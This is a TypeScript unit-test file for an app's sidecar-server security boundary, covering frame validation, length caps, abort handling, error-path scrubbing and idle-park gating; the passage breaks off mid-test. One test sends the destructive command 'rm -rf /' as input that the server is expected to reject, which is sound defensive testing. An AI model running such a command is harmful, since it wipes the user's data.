/**
 * SidecarServer security-boundary unit tests (SECURITY-MINIMUM T4/T5a/T6/T6b/T7).
 *
 * Drives the server with an injectable in-memory socket and a real
 * `AppSessionController`, so the trust-boundary logic is tested without a real
 * Unix socket or Bun subprocess.
 */

import { afterEach, expect, test } from 'bun:test'
import { AppSessionController } from '../../src/app-runtime/AppSessionController.js'
import type { AppSessionControllerAdapter } from '../../src/app-runtime/AppSessionController.js'
import type {
  AppPermissionRequest,
  AppPermissionResponse,
} from '../../src/app-runtime/sessionEvents.js'
import { getDefaultAppState } from '../../src/state/AppStateStore.js'
import { createStore } from '../../src/state/store.js'
import type { ToolPermissionContext } from '../../src/Tool.js'
import type { PermissionUpdate } from '../../src/types/permissions.js'
import { applyPermissionUpdate } from '../../src/utils/permissions/PermissionUpdate.js'
import {
  createTranscriptState,
  projectServerFrame,
  selectTranscriptRows,
} from '../renderer/src/transcriptProjector.js'
import {
  createSlashCatalogState,
  reduceSlashCatalogState,
  selectSlashCatalog,
} from '../renderer/src/slashCatalogState.js'
import { FrameDecoder, encodeFrame } from '../shared/framing.js'
import {
  MAX_FRAME_BYTES,
  MAX_OUTBOUND_FRAME_BYTES,
  MAX_PROMPT_BYTES,
  MAX_TEXT_FIELD_CHARS,
} from '../shared/limits.js'
import {
  PROTOCOL_VERSION,
  type ClientFrame,
  type PermissionContextFrame,
  type ServerFrame,
  type SettingsVerbMessage,
  type SlashCatalogEntry,
} from '../shared/protocol.js'
import {
  createSidecarPermissionDomain,
  type SidecarPermissionDomain,
} from './permissionDomain.js'
import { createSidecarGoalDomain, type SidecarGoalDomain } from './goalDomain.js'
import { createSidecarTasksDomain, type SidecarTasksDomain } from './tasksDomain.js'
import {
  createSidecarTaskControlDomain,
  type SidecarTaskControlDomain,
} from './taskControlDomain.js'
import {
  createSidecarAgentModeDomain,
  type SidecarAgentModeDomain,
} from './agentModeDomain.js'
import type { SidecarRunControlsDomain } from './runControlsDomain.js'
import type { SidecarSessionActionsDomain } from './sessionActionsDomain.js'
import type { RunControlsSnapshot } from '../shared/protocol.js'
import { createTaskStateBase } from '../../src/Task.js'
import type { LocalShellTaskState } from '../../src/tasks/LocalShellTask/guards.js'
import {
  createSidecarAccountsDomain,
  type AccountsCommandExecutor,
  type OAuthLoginRunner,
  type SidecarAccountsDomain,
} from './accountsDomain.js'
import {
  resetCodexAccountPoolForTest,
  seedCodexAccountPoolForTest,
  type PoolAccount,
} from '../../src/services/api/codexAccountPool.js'
import {
  resetClaudeAccountPoolForTest,
  seedClaudeAccountPoolForTest,
} from '../../src/services/api/claudeAccountPool.js'
import {
  createSidecarRemoteSettingsDomain,
  type RemoteSettingsCommandExecutor,
  type SidecarRemoteSettingsDomain,
} from './remoteSettingsDomain.js'
import { SidecarServer, type SidecarSocketLike } from './sidecarServer.js'
import { buildProbeToolUseMessage } from './probeAdapter.js'
import type {
  SidecarWorkspaceTrustDomain,
  WorkspaceTrustAcceptResult,
} from './workspaceTrustDomain.js'
import type { SidecarDiagnosticsDomain } from './diagnosticsDomain.js'
import {
  createSidecarExtensionsDomain,
  type SidecarExtensionsDomain,
} from './extensionsDomain.js'
import type { SidecarSettingsDomain } from './settingsDomain.js'
import { scanForSecrets } from '../shared/secretGuard.js'

const SESSION = 'test-session'
const ENGINE_SESSION = 'engine-test-session'

/** In-memory socket that decodes what the server writes back to it. */
function makeSocket() {
  const decoder = new FrameDecoder(MAX_FRAME_BYTES)
  const received: ServerFrame[] = []
  const socket: SidecarSocketLike = {
    write(data) {
      for (const result of decoder.push(Buffer.from(data))) {
        if (result.kind === 'frame') received.push(result.payload as ServerFrame)
      }
    },
    end() {},
  }
  return { socket, received }
}

function clientFrame(message: ClientFrame['message']): Buffer {
  return encodeFrame({
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
    message,
  } satisfies ClientFrame)
}

/** Adapter that yields the probe message (no permission). */
function probeAdapter(): AppSessionControllerAdapter {
  return {
    async *runTurn() {
      yield buildProbeToolUseMessage()
    },
  }
}

/** Adapter that raises exactly one permission request and awaits its response. */
function permissionAdapter(
  toolInput: Record<string, unknown>,
  onResolved: (r: AppPermissionResponse) => void,
  suggestions?: PermissionUpdate[],
): AppSessionControllerAdapter {
  return {
    async *runTurn({ onPermissionRequest }) {
      const request: AppPermissionRequest = {
        requestId: 'perm-1',
        request: {
          subtype: 'can_use_tool',
          tool_name: 'Bash',
          input: toolInput,
          tool_use_id: 'toolu_1',
          ...(suggestions ? { permission_suggestions: suggestions } : {}),
        },
      }
      const response = await onPermissionRequest(request)
      onResolved(response)
    },
  }
}

/** An engine-minted "always allow" suggestion, as the gate would produce it. */
function bashSuggestion(ruleContent: string): PermissionUpdate {
  return {
    type: 'addRules',
    rules: [{ toolName: 'Bash', ruleContent }],
    behavior: 'allow',
    destination: 'localSettings',
  }
}

/**
 * The accounts domain re-reads the vault from disk when a write target misses
 * the in-process pool. Stub that by default so no boundary test in this file
 * can reach the real vault.
 */
function makeAccountsDomain(
  options: NonNullable<Parameters<typeof createSidecarAccountsDomain>[0]> = {},
) {
  return createSidecarAccountsDomain({ reloadPool: async () => {}, ...options })
}

let servers: SidecarServer[] = []
function makeServer(
  controller: AppSessionController,
  permissions?: SidecarPermissionDomain,
  goals?: SidecarGoalDomain,
  accounts?: SidecarAccountsDomain,
  workspaceTrust?: SidecarWorkspaceTrustDomain,
  diagnostics?: SidecarDiagnosticsDomain,
  remoteSettings?: SidecarRemoteSettingsDomain,
  tasks?: SidecarTasksDomain,
  extensions?: SidecarExtensionsDomain,
  agentMode?: SidecarAgentModeDomain,
  settings?: SidecarSettingsDomain,
  runControls?: SidecarRunControlsDomain,
  sessionActions?: SidecarSessionActionsDomain,
  taskControl?: SidecarTaskControlDomain,
): SidecarServer {
  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller,
    ...(permissions ? { permissions } : {}),
    ...(goals ? { goals } : {}),
    ...(accounts ? { accounts } : {}),
    ...(workspaceTrust ? { workspaceTrust } : {}),
    ...(diagnostics ? { diagnostics } : {}),
    ...(remoteSettings ? { remoteSettings } : {}),
    ...(tasks ? { tasks } : {}),
    ...(extensions ? { extensions } : {}),
    ...(agentMode ? { agentMode } : {}),
    ...(settings ? { settings } : {}),
    ...(runControls ? { runControls } : {}),
    ...(sessionActions ? { sessionActions } : {}),
    ...(taskControl ? { taskControl } : {}),
    log: () => {},
  })
  servers.push(server)
  return server
}

/** A fake settings domain — exercises the SERVER boundary (schema + allowlist +
 * dispatch + result frame + re-broadcast) without a real disk write (that round
 * trip is proven in settingsDomain.test.ts). */
function fakeSettingsDomain(
  runVerb: SidecarSettingsDomain['runVerb'] = () => ({
    ok: true,
    message: 'Updated.',
    changed: true,
  }),
): SidecarSettingsDomain {
  return {
    getSnapshot: () => ({
      layers: [],
      resolved: [],
      policyOrigin: null,
      editableValues: [],
    }),
    runVerb,
  }
}

/** Real engine app-state store seeded with an (optionally customized) context. */
function makePermissionStore(context?: Partial<ToolPermissionContext>) {
  const base = getDefaultAppState()
  return createStore({
    ...base,
    toolPermissionContext: { ...base.toolPermissionContext, ...context },
  })
}

afterEach(() => {
  for (const s of servers) s.close()
  servers = []
})

test('on attach, the server sends the canonical controller-derived app.ready payload', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()

  server.addConnection(socket)

  expect(received[0]).toEqual({
    kind: 'ready',
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
      engineSessionId: ENGINE_SESSION,
    payload: {
      type: 'app.ready',
      protocolVersion: PROTOCOL_VERSION,
      inputEnabled: true,
      activeTurn: false,
      abort: { status: 'idle' },
      goalSnapshot: null,
      pendingPermissionRequests: [],
    },
  })
})

test('rejects a frame with the wrong protocolVersion', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, encodeFrame({ protocolVersion: 999, sessionId: SESSION, message: { type: 'app.ping', nonce: 'x' } }))
  const err = received.find(f => f.kind === 'error')
  expect(err?.kind).toBe('error')
})

test('rejects a frame addressed to a different sessionId', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, encodeFrame({ protocolVersion: PROTOCOL_VERSION, sessionId: 'other', message: { type: 'app.ping', nonce: 'x' } }))
  const err = received.find(f => f.kind === 'error' && f.message.includes('sessionId'))
  expect(err).toBeDefined()
})

test('rejects an unallowlisted message type', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, encodeFrame({ protocolVersion: PROTOCOL_VERSION, sessionId: SESSION, message: { type: 'run-command', command: 'rm -rf /' } }))
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('app.ping is answered with a pong', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, clientFrame({ type: 'app.ping', nonce: 'nonce-1' }))
  const pong = received.find(f => f.kind === 'pong')
  expect(pong?.kind).toBe('pong')
})

test('T7 — rejects a prompt over the length cap', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, clientFrame({ type: 'app.submit', requestId: 'r1', prompt: 'x'.repeat(MAX_PROMPT_BYTES + 1) }))
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('T7 — rejects an app.ping nonce over the text cap (and answers no pong)', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({ type: 'app.ping', nonce: 'x'.repeat(MAX_TEXT_FIELD_CHARS + 1) }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'pong')).toBe(false)
})

test('boundary — a valid app.abort aborts the turn and mass-denies pendings', async () => {
  // A4/C4: `app.abort` is the only kill path, and it had no boundary test in
  // either direction — neither its accept path nor its reason cap.
  let denied: AppPermissionResponse | null = null
  const controller = new AppSessionController({
    async *runTurn({ onPermissionRequest }) {
      denied = await onPermissionRequest({
        requestId: 'perm-abort',
        request: {
          subtype: 'can_use_tool',
          tool_name: 'Bash',
          input: { command: 'ls' },
          tool_use_id: 'toolu_abort',
        },
      })
    },
  })
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)
  server.handleData(
    conn,
    clientFrame({ type: 'app.abort', requestId: 'ab1', reason: 'user stopped' }),
  )

  await waitFor(() => denied !== null)
  expect(denied!.behavior).toBe('deny')
  expect(controller.getPendingPermissionRequests().length).toBe(0)
  expect(received.some(f => f.kind === 'error')).toBe(false)
})

test('T7 — rejects an app.abort reason over the text cap (no abort)', () => {
  let aborts = 0
  const controller = new AppSessionController(probeAdapter())
  const realAbort = controller.abort.bind(controller)
  controller.abort = (reason?: string) => {
    aborts += 1
    return realAbort(reason)
  }
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    clientFrame({
      type: 'app.abort',
      requestId: 'ab2',
      reason: 'x'.repeat(MAX_TEXT_FIELD_CHARS + 1),
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(aborts).toBe(0)
})

/*
 * Error frames are the ONE outbound kind exempted from the secret-key guard
 * (loop avoidance), and several call sites forward raw engine text. A failed
 * vault unlink carries the vault file path, which SECURITY-MINIMUM §4 lists as
 * a forbidden crossing, and the guard would not have caught it either way (it
 * scans key names, not values).
 */
test('F6 — an error frame carrying raw engine text has its filesystem paths stripped and its length bounded', async () => {
  const accounts = makeAccountsDomain({
    executor: fakeExecutor({
      logout: () => {
        throw new Error(
          `EACCES: permission denied, unlink '/Users/someone/.cat-code/vault/accounts/acct-1.json'`,
        )
      },
    }),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, accountFrame({ type: 'account.logout', requestId: 'lo1' } as never))
  await flush()

  const err = received.find(f => f.kind === 'error')
  expect(err?.kind).toBe('error')
  const text = err && err.kind === 'error' ? err.message : ''
  expect(text).not.toContain('/Users/someone')
  expect(text).not.toContain('.cat-code/vault')
  expect(text).toContain('EACCES')
  expect(JSON.stringify(received)).not.toContain('/Users/someone')
})

test('F6 — an over-long error message is truncated before it leaves', async () => {
  const accounts = makeAccountsDomain({
    executor: fakeExecutor({
      logout: () => {
        throw new Error('z'.repeat(50_000))
      },
    }),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, accountFrame({ type: 'account.logout', requestId: 'lo2' } as never))
  await flush()

  const err = received.find(f => f.kind === 'error')
  expect(err?.kind).toBe('error')
  if (err?.kind === 'error') {
    expect(err.message.length).toBeLessThanOrEqual(1_001)
  }
})

/* ------------------------------------------------------------------------- *
 * IDLE-PARK (decisions/IDLE-PARK.md §3/§6) — the park gate, the parking latch,
 * and the R2-F2 no-turn-loss race. `onPark` is a counting spy here (in
 * production it exits the process with PARKED_EXIT_CODE); a park is otherwise
 * silent — the exit code, not any frame, is the signal.
 * ------------------------------------------------------------------------- */

/** A turn that stays active (no permission raised) until `release()` is called. */
function gatedTurnAdapter(): {
  adapter: AppSessionControllerAdapter
  release: () => void
} {
  let release = () => {}
  const gate = new Promise<void>(resolve => {
    release = resolve
  })
  return {
    adapter: {
      async *runTurn() {
        await gate
        yield buildProbeToolUseMessage()
      },
    },
    release,
  }
}

/** A server wired with a counting `onPark` spy that NEVER exits the process. */
function makeParkServer(
  controller: AppSessionController,
  tasks?: SidecarTasksDomain,
  extra: {
    accounts?: SidecarAccountsDomain
    sessionActions?: SidecarSessionActionsDomain
  } = {},
): { server: SidecarServer; parkCount: () => number } {
  let parks = 0
  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller,
    ...(tasks ? { tasks } : {}),
    ...(extra.accounts ? { accounts: extra.accounts } : {}),
    ...(extra.sessionActions ? { sessionActions: extra.sessionActions } : {}),
    onPark: () => {
      parks += 1
    },
    log: () => {},
  })
  servers.push(server)
  return { server, parkCount: () => parks }
}

/** True iff a live (non-replay) `user` message event was broadcast — i.e. a turn
 * was actually accepted and started (broadcast synchronously in handleSubmit,
 * BEFORE controller.submit; its absence proves the submit was rejected early). */
function sawUserTurn(received: ServerFrame[]): boolean {
  return received.some(
    frame =>
      frame.kind === 'event' &&
      frame.event.type === 'message' &&
      frame.event.message.type === 'user',
  )
}

/** A running local_bash task, seeded into the app-state store the tasks domain reads. */
function runningBashTask(): LocalShellTaskState {
  return {
    ...createTaskStateBase('park-b1', 'local_bash', 'sleep 100'),
    type: 'local_bash',
    status: 'running',
    command: 'sleep 100',
    completionStatusSentInAttachment: false,
    shellCommand: null,
    lastReportedTotalLines: 0,
    isBackgrounded: true,
  }
}

test('IDLE-PARK boundary — a valid app.park on an idle session gates the exit (onPark fires, no frame)', () => {
  const { server, parkCount } = makeParkServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, clientFrame({ type: 'app.park', requestId: 'park-1' }))

  expect(parkCount()).toBe(1)
  // Silent: no ack/refuse/error frame — the exit code is the only signal.
  expect(received.some(f => f.kind === 'error')).toBe(false)
})

test('IDLE-PARK boundary — an app.park with an extra key is rejected bad_request (no park)', () => {
  const { server, parkCount } = makeParkServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'app.park', requestId: 'park-1', destination: 'session' },
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(parkCount()).toBe(0)
})

test('IDLE-PARK boundary — an app.park with a non-string requestId is rejected bad_request (no park)', () => {
  const { server, parkCount } = makeParkServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'app.park', requestId: 123 },
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(parkCount()).toBe(0)
})

test('IDLE-PARK gate — app.park is DECLINED while a turn is active (no exit, session stays live)', async () => {
  const { adapter, release } = gatedTurnAdapter()
  const controller = new AppSessionController(adapter)
  const { server, parkCount } = makeParkServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  // Start a turn that stays active (no permission), then try to park.
  server.handleData(conn, clientFrame({ type: 'app.submit', requestId: 's1', prompt: 'go' }))
  expect(sawUserTurn(received)).toBe(true)
  server.handleData(conn, clientFrame({ type: 'app.park', requestId: 'park-1' }))

  expect(parkCount()).toBe(0)
  // The session is still live: a ping still answers.
  server.handleData(conn, clientFrame({ type: 'app.ping', nonce: 'n1' }))
  expect(received.some(f => f.kind === 'pong')).toBe(true)

  release()
  await waitFor(() => received.filter(f => f.kind === 'event').length >= 2)
})

test('IDLE-PARK gate — app.park is DECLINED while a permission is pending (no exit)', async () => {
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, () => {}),
  )
  const { server, parkCount } = makeParkServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, clientFrame({ type: 'app.submit', requestId: 's1', prompt: 'go' }))
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(conn, clientFrame({ type: 'app.park', requestId: 'park-1' }))

  expect(parkCount()).toBe(0)
  // The permission is untouched — park did not resolve or drop it.
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('IDLE-PARK gate — app.park is DECLINED while a task is running (no exit)', () => {
  const store = makePermissionStore()
  store.setState(prev => ({ ...prev, tasks: { 'park-b1': runningBashTask() } }))
  const { server, parkCount } = makeParkServer(
    new AppSessionController(probeAdapter()),
    createSidecarTasksDomain(store),
  )
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  // No active turn, no pending permission — the ONLY blocker is the running task.
  server.handleData(conn, clientFrame({ type: 'app.park', requestId: 'park-1' }))

  expect(parkCount()).toBe(0)
})

test('IDLE-PARK gate — app.park is DECLINED while a FOREGROUNDED local_agent runs (the display-snapshot hole)', () => {
  const store = makePermissionStore()
  // A running agent-mode worker the user has FOREGROUNDED to watch. This is the
  // exact hole: `activeTurn` is only set by handleSubmit (false here), and the
  // DISPLAY snapshot filters out the foregrounded local_agent — so a gate reading
  // getSnapshot().items would see NOTHING and park over a live worker (turn loss).
  const foregroundedWorker = {
    ...createTaskStateBase('fg-agent', 'local_agent', 'Wire the auth flow'),
    type: 'local_agent' as const,
    status: 'running' as const,
    agentId: 'agent-live',
    agentType: 'implementor',
    agentName: 'Turing',
    isBackgrounded: false,
  }
  store.setState(prev => ({
    ...prev,
    tasks: { 'fg-agent': foregroundedWorker } as never,
    foregroundedTaskId: 'fg-agent',
  }))
  const tasks = createSidecarTasksDomain(store)

  // Prove the hole is real: the display snapshot hides this live worker…
  expect(tasks.getSnapshot().items).toHaveLength(0)
  // …but the foreground-inclusive raw-store gate sees it.
  expect(tasks.hasLiveWork()).toBe(true)

  const { server, parkCount } = makeParkServer(
    new AppSessionController(probeAdapter()),
    tasks,
  )
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, clientFrame({ type: 'app.park', requestId: 'park-1' }))

  // Park DECLINED — the live foregrounded worker is not killed.
  expect(parkCount()).toBe(0)
})

/*
 * The park gate used to know about turns, permissions, and tasks only. Account
 * verbs and session actions are dispatched fire-and-forget, so the idle sweep
 * could fire mid-flight and `process.exit` with no drain. A token refresh has
 * already taken a cross-process lock and written `refresh.state: in_flight` to
 * the vault before its network call, so exiting there orphans the lock and gets
 * the account quarantined by the next refresher, with no auth failure anywhere.
 * These four tests pin the two new gates and their release.
 */

/** An accounts domain whose one verb never settles until `settle()` is called. */
function hangingAccountsDomain(): {
  domain: SidecarAccountsDomain
  settle: () => void
} {
  let settle = () => {}
  const gate = new Promise<void>(resolve => {
    settle = resolve
  })
  const domain = makeAccountsDomain({
    executor: fakeExecutor({
      touchAll: async () => {
        await gate
        return { ok: true, message: 'Refresh complete.' }
      },
    }),
  })
  return { domain, settle }
}

test('IDLE-PARK gate — app.park is DECLINED while an account verb is still writing (no exit)', async () => {
  const { domain, settle } = hangingAccountsDomain()
  const { server, parkCount } = makeParkServer(
    new AppSessionController(probeAdapter()),
    undefined,
    { accounts: domain },
  )
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, clientFrame({ type: 'account.touchAll', requestId: 'a1' }))
  await flush()
  // No turn, no permission, no task: the in-flight vault write is the ONLY blocker.
  server.handleData(conn, clientFrame({ type: 'app.park', requestId: 'park-1' }))

  expect(parkCount()).toBe(0)
  settle()
})

test('IDLE-PARK gate — the park gate reopens once the account verb settles', async () => {
  const { domain, settle } = hangingAccountsDomain()
  const { server, parkCount } = makeParkServer(
    new AppSessionController(probeAdapter()),
    undefined,
    { accounts: domain },
  )
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, clientFrame({ type: 'account.touchAll', requestId: 'a1' }))
  await flush()
  settle()
  await flush()

  server.handleData(conn, clientFrame({ type: 'app.park', requestId: 'park-1' }))
  expect(parkCount()).toBe(1)
})

test('IDLE-PARK gate — app.park is DECLINED while a session.branch fork is still writing (no exit)', async () => {
  let settle = () => {}
  const gate = new Promise<void>(resolve => {
    settle = resolve
  })
  const sessionActions: SidecarSessionActionsDomain = {
    async rename() {
      return { ok: true, message: 'Renamed.' }
    },
    async export() {
      return { ok: true, message: 'Exported.', exportText: '' }
    },
    async branch() {
      await gate
      return { ok: true, message: 'Branched.', branchEngineSessionId: 'fork' }
    },
    async tag() {
      return { ok: true, message: 'Tagged.' }
    },
  }
  const { server, parkCount } = makeParkServer(
    new AppSessionController(probeAdapter()),
    undefined,
    { sessionActions },
  )
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, clientFrame({ type: 'session.branch', requestId: 'b1' }))
  await flush()
  server.handleData(conn, clientFrame({ type: 'app.park', requestId: 'park-1' }))

  expect(parkCount()).toBe(0)
  settle()
})

test('IDLE-PARK gate — app.park is DECLINED while an OAuth sign-in is under way (no exit)', async () => {
  // `account.login` acks immediately and the real flow keeps running in the
  // background, so the in-flight counter above cannot see it. The runner here
  // never resolves, standing in for a browser the user has not finished with.
  const accounts = makeAccountsDomain({
    executor: fakeExecutor(),
    oauthRunner: {
      begin: () => new Promise(() => {}),
    },
  })
  const { server, parkCount } = makeParkServer(
    new AppSessionController(probeAdapter()),
    undefined,
    { accounts },
  )
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(conn, clientFrame({ type: 'account.login', requestId: 'l1' }))
  await flush()
  server.handleData(conn, clientFrame({ type: 'app.park', requestId: 'park-1' }))

  expect(parkCount()).toBe(0)
})

test('IDLE-PARK R2-F2 — submit dispatched BEFORE park: the turn runs, park is declined, no exit', () => {
  const { adapter, release } = gatedTurnAdapter()
  const controller = new AppSessionController(adapter)
  const { server, parkCount } = makeParkServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  // No `await` between the two dispatches (the R2-F2 ordering): the submit sets
  // activeTurn synchronously, so the park gate sees it and declines.
  server.handleData(conn, clientFrame({ type: 'app.submit', requestId: 's1', prompt: 'go' }))
  server.handleData(conn, clientFrame({ type: 'app.park', requestId: 'park-1' }))

  // The turn ran (user event broadcast), and the park did NOT exit.
  expect(sawUserTurn(received)).toBe(true)
  expect(received.some(f => f.kind === 'error' && f.code === 'session_disconnected')).toBe(false)
  expect(parkCount()).toBe(0)

  release()
})

test('IDLE-PARK R2-F2 — park dispatched BEFORE submit: park exits, submit rejected session_disconnected, controller.submit NEVER called', async () => {
  let turnStarts = 0
  const controller = new AppSessionController({
    async *runTurn() {
      turnStarts += 1
      yield buildProbeToolUseMessage()
    },
  })
  const { server, parkCount } = makeParkServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  // Park latches + would-exit; the submit that follows sees `parking`.
  server.handleData(conn, clientFrame({ type: 'app.park', requestId: 'park-1' }))
  server.handleData(conn, clientFrame({ type: 'app.submit', requestId: 's1', prompt: 'go' }))

  expect(parkCount()).toBe(1)
  // The submit was rejected with the existing session_disconnected code, retryable.
  const err = received.find(
    f => f.kind === 'error' && f.code === 'session_disconnected',
  )
  expect(err).toBeDefined()
  if (err?.kind === 'error') {
    expect(err.requestId).toBe('s1')
    expect(err.retryable).toBe(true)
  }
  // No turn started: no user event was broadcast and controller.submit → runTurn
  // was never reached (belt-and-suspenders against async).
  expect(sawUserTurn(received)).toBe(false)
  await new Promise(resolve => setTimeout(resolve, 5))
  expect(turnStarts).toBe(0)
})

test('app.submit emits the live user event before the assistant and the projector renders it once', async () => {
  let controllerUuid: string | undefined
  let controllerPrompt: unknown
  const controller = new AppSessionController({
    async *runTurn({ prompt, options }) {
      controllerPrompt = prompt
      controllerUuid = options?.uuid
      yield {
        type: 'assistant',
        message: {
          id: 'msg-live-assistant',
          role: 'assistant',
          content: [{ type: 'text', text: 'assistant response' }],
        },
        parent_tool_use_id: null,
        session_id: ENGINE_SESSION,
        uuid: '00000000-0000-4000-8000-00000000a001',
      } as never
    },
  })
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    clientFrame({
      type: 'app.submit',
      requestId: 'r-live-user',
      prompt: 'hello desktop',
    }),
  )
  await waitFor(
    () =>
      received.filter(f => f.kind === 'event' && f.event.type === 'message')
        .length >= 2,
  )

  // Message events only: the turn boundary (`turn.status`) also rides this
  // stream, and this test is about the ORDER OF THE TWO MESSAGES.
  const events = received.filter(
    (frame): frame is Extract<ServerFrame, { kind: 'event' }> =>
      frame.kind === 'event' && frame.event.type === 'message',
  )
  const firstEvent = events[0]!.event
  const secondEvent = events[1]!.event
  expect(firstEvent.type).toBe('message')
  expect(secondEvent.type).toBe('message')
  if (
    firstEvent.type !== 'message' ||
    secondEvent.type !== 'message' ||
    firstEvent.message.type !== 'user'
  ) {
    throw new Error('expected first live event to be the submitted user message')
  }
  expect(secondEvent.message.type).toBe('assistant')

  const userMessage = firstEvent.message
  expect(userMessage.message).toEqual({
    role: 'user',
    content: 'hello desktop',
  })
  expect(userMessage.session_id).toBe(ENGINE_SESSION)
  expect(userMessage.parent_tool_use_id).toBe(null)
  expect(typeof userMessage.uuid).toBe('string')
  expect(controllerPrompt).toBe('hello desktop')
  expect(controllerUuid).toBe(userMessage.uuid)

  let state = createTranscriptState()
  state = projectServerFrame(state, received[0]!)
  state = projectServerFrame(state, events[0]!)
  let rows = selectTranscriptRows(state, SESSION)
  expect(rows.filter(row => row.kind === 'user-text')).toEqual([
    expect.objectContaining({
      kind: 'user-text',
      content: 'hello desktop',
      frameId: userMessage.uuid,
    }),
  ])

  state = projectServerFrame(state, { ...events[0]!, replay: true })
  rows = selectTranscriptRows(state, SESSION)
  expect(rows.filter(row => row.kind === 'user-text')).toHaveLength(1)
})

test('fresh-session slash catalog — rich slash-catalog.snapshot is delivered on attach and populates the picker before any turn', () => {
  // The engine ships names-only on the per-turn `system/init.slash_commands`, so
  // the P3-7 picker rendered bare `/name` rows until (and only with) the first
  // turn. The sidecar now pushes a RICH `slash-catalog.snapshot` (name +
  // description + arg hint) on connect. Prove the frame arrives with NO submit,
  // and that the renderer's OWN reducer captures exactly what the picker reads.
  const slashCatalog: SlashCatalogEntry[] = [
    { name: 'help', description: 'Show help' },
    { name: 'model', description: 'Switch the model', argumentHint: '<name>' },
  ]

  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller: new AppSessionController(probeAdapter()),
    slashCatalog,
    log: () => {},
  })
  servers.push(server)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  // No app.submit — this is exactly the fresh-session case that was broken.
  const catalogFrames = received.filter(
    (frame): frame is Extract<ServerFrame, { kind: 'slash-catalog.snapshot' }> =>
      frame.kind === 'slash-catalog.snapshot',
  )
  expect(catalogFrames).toHaveLength(1)
  expect(catalogFrames[0]!.commands).toEqual(slashCatalog)

  // Drive the renderer's real reducer with the frame, then read exactly what the
  // SlashCommandPicker reads — rich rows with descriptions + arg hints.
  let state = createSlashCatalogState()
  state = reduceSlashCatalogState(state, { type: 'frame', frame: catalogFrames[0]! })
  expect(selectSlashCatalog(state, SESSION)).toEqual(slashCatalog)
})

test('catalog owner (decision #4) — the sidecar no longer enumerates, arms a catalog timer, or emits a sessions.snapshot on attach', () => {
  // The per-sidecar catalog was moved to a single main-supervised worker
  // (CATALOG-OWNERSHIP shape (b)): a session catalog now reaches the renderer as
  // a `sessions-catalog` host event, never a sidecar frame. Prove the removal —
  // no timer is armed and attach sends no `sessions.snapshot` frame.
  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller: new AppSessionController(probeAdapter()),
    log: () => {},
  })
  servers.push(server)
  expect(
    (server as unknown as { sessionsCatalogRefreshTimer?: unknown })
      .sessionsCatalogRefreshTimer,
